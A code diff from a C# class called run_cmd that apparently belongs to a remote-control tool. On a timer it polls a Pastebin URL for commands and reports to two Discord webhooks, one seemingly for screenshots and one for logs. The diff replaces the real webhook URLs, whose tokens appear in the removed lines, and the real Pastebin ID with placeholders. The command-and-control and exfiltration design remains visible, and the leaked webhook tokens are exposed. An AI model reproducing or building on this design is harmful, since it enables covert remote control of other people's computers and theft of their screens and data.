@@ -164,8 +164,8 @@ public class run_cmd
     public string temp = "";
     public bool end_cmd = false;
     public bool first_cmd = true;
-    public string webhook_scr = "https://discord.com/api/webhooks/1136284717797347360/Jq50goaabk6Lt2B3RVQDyJg6luoE5x5-ARi-sYVW3V7gxOnYcfc-NsaATHxf29dpWiHT";
-    public string webhook_log = "https://discord.com/api/webhooks/1137348914287222805/uE5VzAYtjkGsLlAZKaogjAOLRGQEHmIpYgd9oT2GunQ-Vfd9diQ7F_VlMOoQNH9BpI-R";
+    public string webhook_scr = "WEB HOOK 1";
+    public string webhook_log = "WEB HOOK 2";
     public void start()
     {
         System.Timers.Timer timer = new System.Timers.Timer(15000);
@@ -199,7 +199,7 @@ public class run_cmd
     }
     public void check_command()
     {
-        string url = "https://pastebin.com/raw/wjGKGNKL";
+        string url = "https://pastebin.com/raw/{pastebin note ID}";
         using (WebClient client = new WebClient())
         {
             try
